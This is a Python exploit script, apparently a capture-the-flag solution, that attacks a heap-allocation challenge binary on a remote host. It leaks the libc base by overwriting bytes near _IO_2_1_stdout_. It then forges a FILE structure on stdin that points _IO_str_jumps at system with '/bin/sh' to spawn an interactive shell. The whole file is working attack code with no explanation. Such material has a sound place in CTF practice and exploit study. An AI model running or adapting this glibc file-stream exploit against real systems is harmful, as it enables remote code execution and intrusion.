from ptrlib import *
import time
import os

def new(size, offset, data, quiet=False):
    if quiet:
        sock.sendline("1")
        sock.sendline(str(size))
        sock.sendline(str(offset))
        sock.sendline(data)
    else:
        sock.sendlineafter("> ", "1")
        sock.sendlineafter(": ", str(size))
        sock.sendlineafter(": ", str(offset))
        sock.sendlineafter(": ", data)

HOST = os.getenv("HOST", "153.120.170.218")
PORT = os.getenv("PORT", "9003")
        
libc = ELF("../files/libc-2.27.so")
#sock = Process("../files/chall")
sock = Socket(HOST, int(PORT))

# make chunk adjacent to libc
base = 0x200000
space = (base + 0x1000) * 1 - 0x10
new(base, space + libc.symbol('_IO_2_1_stdout_') + 0x10 + 1, 'A')
space = (base + 0x1000) * 2 - 0x10
new(base, space + libc.symbol('_IO_2_1_stdout_') + 0x20 + 1, 'A', quiet=True)
libc_base = u64(sock.recvline()[0x08:0x10]) - 0x3ed8b0
logger.info("libc = " + hex(libc_base))

# get the shell!
space = (base + 0x1000) * 3 - 0x10
new(base, space + libc.symbol('_IO_2_1_stdin_') + 0x38 + 1, 'A')

payload = p64(0xfbad208b)
payload += p64(libc_base + libc.symbol('_IO_2_1_stdout_') + 0xd8)
payload += p64(libc_base + libc.symbol('_IO_2_1_stdout_')) * 6
payload += p64(libc_base + libc.symbol('_IO_2_1_stdout_') + 0x2000)
payload += b'\0' * (8*7 + 4) # padding
new_size = libc_base + next(libc.find("/bin/sh"))
payload += p64(0xfbad1800)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64((new_size - 100) // 2) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(0) # _IO_buf_base
payload += p64((new_size - 100) // 2) # _IO_buf_end
payload += p64(0) * 4
payload += p64(libc_base + libc.symbol("_IO_2_1_stdin_"))
payload += p64(1) + p64((1<<64) - 1)
payload += p64(0) + p64(libc_base + 0x3ed8c0)
payload += p64((1<<64) - 1) + p64(0)
payload += p64(libc_base + 0x3eb8c0)
payload += p64(0) * 6
payload += p64(libc_base + 0x3e8360) # _IO_str_jumps
payload += p64(libc_base + libc.symbol("system"))
payload += p64(libc_base + libc.symbol("_IO_2_1_stdout_"))
payload += p64(libc_base + libc.symbol("_IO_2_1_stdin_"))
sock.sendlineafter("> ", payload)

sock.interactive()
